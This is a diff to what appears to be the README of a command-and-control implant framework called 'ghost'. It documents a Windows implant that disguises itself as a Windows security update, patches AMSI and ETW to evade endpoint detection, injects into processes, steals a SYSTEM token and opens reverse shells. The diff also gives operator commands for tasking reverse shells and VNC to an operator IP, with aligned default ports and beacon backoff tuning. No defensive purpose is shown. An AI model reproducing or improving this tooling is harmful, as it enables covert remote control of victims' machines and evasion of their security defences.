@@ -218,7 +218,7 @@ sequenceDiagram
 | **Self-install** | Copies to `%APPDATA%\Microsoft\WindowsUpdate\WindowsSecurityUpdate.exe`, sets hidden + system, launches the installed copy, then deletes the original via a delayed `cmd /c ping & del`. If the copy fails it runs in place. |
 | **Supervisor** | Any worker exit other than `0xDEAD` (clean operator `exit` / migration) is treated as a crash and restarted with exponential backoff capped at 60 s. |
 | **Evasion re-apply** | AMSI/ETW patches are re-applied on every beacon pass and forcibly re-applied after a reconnect, because a restarting EDR can un-patch the process. |
-| **Beacon pacing** | Immediate re-beacon after executing a task (no sleep) so command chains run back-to-back; failure backoff is `BEACON_MIN × 2^failures` capped at 30 min, shortened to 3 s while in rapid-poll shell mode. |
+| **Beacon pacing** | Immediate re-beacon after executing a task (no sleep) so command chains run back-to-back; consecutive failures back off as `BEACON_MIN × BACKOFF_FACTOR^(failures-1)`, holding after `MAX_FAILURES` steps and capped at `BACKOFF_MAX_SEC` (30 min). The same schedule covers thrown exceptions, and it shortens to 3 s while in rapid-poll shell mode. |
 | **Output caps** | Text results are truncated at `CMD_OUTPUT_MAX`; screenshots and `!live` frames are exempt and allowed up to 32 MB, otherwise base64 BMPs arrive corrupted. |
 
 ---
@@ -296,12 +296,11 @@ recomputed by delta. Numbers are then written into freshly allocated RX trampoli
 
 All eleven entries are resolved through **`RESOLVE_OPT`**: a number that cannot be found is skipped
 silently, and each injection helper tests its slot and falls back to the Win32 equivalent
-(`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`) when it is null. A
-strict `RESOLVE` macro — any miss aborts initialization — exists for hard-critical entries but is
-not currently used, so `InitializeSyscalls` only fails outright when ntdll can neither be read from
-disk nor mapped from the loaded module, or its export table will not parse. `WinMain` retries the
-initialization five times, five seconds apart, then lets the thread return so the supervisor
-restarts it.
+(`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`) when it is null. No entry
+is mandatory — every call site null-checks first — so `InitializeSyscalls` only fails outright when
+ntdll can neither be read from disk nor mapped from the loaded module, or its export table will not
+parse. `WinMain` retries the initialization five times, five seconds apart, then lets the thread
+return so the supervisor restarts it.
 
 Stub bytes are an 11-byte `mov r10,rcx / mov eax,<ssn> / syscall / ret` written into a single
 `VirtualAlloc` pool that is flipped to `PAGE_EXECUTE_READ` and icache-flushed after the last stub
@@ -408,7 +407,7 @@ Configuration precedence (highest first): **CLI flags → environment → `~/.gh
 | `c2_cli.py audit [--limit N] [--json]` | Operator audit trail |
 | `c2_cli.py watch [--interval N]` | Full-screen live session list with new-session notifications |
 | `c2_cli.py payload upload <file>` | Stage a binary for `!getfile` retrieval |
-| `c2_cli.py listen [--port <p>]` | Local listener for `!reverse` dial-out shells (**default 4444**) |
+| `c2_cli.py listen [--port <p>]` | Local listener for `!reverse` dial-out shells (**default 4444**, the port `!reverse` dials) |
 | `c2_cli.py config show` / `config set --url --token --proxy` | Inspect / persist operator config |
 | `c2_cli.py ping` | Server reachability + live node count |
 
@@ -420,9 +419,10 @@ Readline history persists to `~/.ghost/history` with tab completion on the commo
 available. The CLI rotates realistic browser User-Agents per request and disables TLS-warning noise
 by default; pass `--ssl-verify` when the server has a real certificate.
 
-> **Port pairing.** `!reverse` defaults to port **443** while `listen` defaults to **4444**, so the
-> two only meet if you say so explicitly: `listen --port 443` (needs a free privileged port) or
-> `!reverse <operator-ip>:4444`.
+> **Port pairing.** `!reverse` defaults to **4444**, which is exactly what `listen` binds — so
+> `!reverse <operator-ip>` and a bare `c2_cli.py listen` meet without either side naming a port.
+> Move both together with `:port` on the command and `--port` on the listener. This is deliberately
+> not `C2_PORT` (443), which is the beacon endpoint, not a shell listener.
 
 ---
 
@@ -497,7 +497,7 @@ implant owns the shell state, so the working directory and `set` variables survi
 | `!inject-apc <pid> <hex bytes>` | Same payload, delivered as an APC to one of the target's threads |
 | `!migrate [pid]` | Re-spawn the implant as a PPID-spoofed child of `pid` (default: a SYSTEM `svchost.exe`) and exit cleanly |
 | `steal_token` | Locates `winlogon.exe`, duplicates its primary token and impersonates SYSTEM (**no arguments**) |
-| `!reverse <ip[:port]>` | Reverse TCP shell, default port 443 → pair with `c2_cli.py listen` |
+| `!reverse <ip[:port]>` | Reverse TCP shell; default port **4444** matches `c2_cli.py listen` |
 | `!kill <pid>` | Terminate a process |
 | `!env` · `!getpid` | Environment block dump / implant PID |
 | `!shell [off]` | Rapid-poll mode: beacon drops to 1 s for interactive use; `!shell off` restores the default interval |
@@ -558,7 +558,7 @@ server values route through one config dictionary.
 | `GHOST_C2_HOST` / `GHOST_C2_PORT` / `GHOST_BEACON_TOKEN_W` | Raw `-D` macros the script emits | set by `build.sh` |
 | `GHOST_K0..K3` (`obfuscate.hpp`) | Rotating XOR key — change per campaign build | `A7 3E C1 58` |
 | `CMD_OUTPUT_MAX` / `CMD_TIMEOUT_MS` | 65536 chars of text result before truncation / 30 s per command | `include/config.hpp` |
-| `MAX_FAILURES` / `BACKOFF_FACTOR` | 5 / 3 — declared for reference; the live beacon backoff is computed in `src/c2.cpp` as `BEACON_MIN × 2^failures`, capped 30 min | `include/config.hpp` |
+| `MAX_FAILURES` / `BACKOFF_FACTOR` / `BACKOFF_MAX_SEC` | The live failure-backoff ladder in `BeaconFailureBackoff` (`src/c2.cpp`): 5 / 3 / 1800 s → 18, 54, 162, 486, then 1458 s held | `include/config.hpp` |
 
 ### Server
 
@@ -649,8 +649,8 @@ python server/c2_cli.py audit --limit 200 --json >> run_01.json
 **Reverse shell + desktop.**
 
 ```bash
-python server/c2_cli.py listen --port 4444 &      # operator listener
-python server/c2_cli.py task <sid> "!reverse <operator-ip>:4444"
+python server/c2_cli.py listen &                  # operator listener on 4444
+python server/c2_cli.py task <sid> "!reverse <operator-ip>"   # same default, no port needed
 python server/c2_cli.py task <sid> "!vnc <operator-ip>:5500"
 # the operator side must already be listening:
 #   vncviewer -listen            (viewer in reverse/listen mode on 5500), or
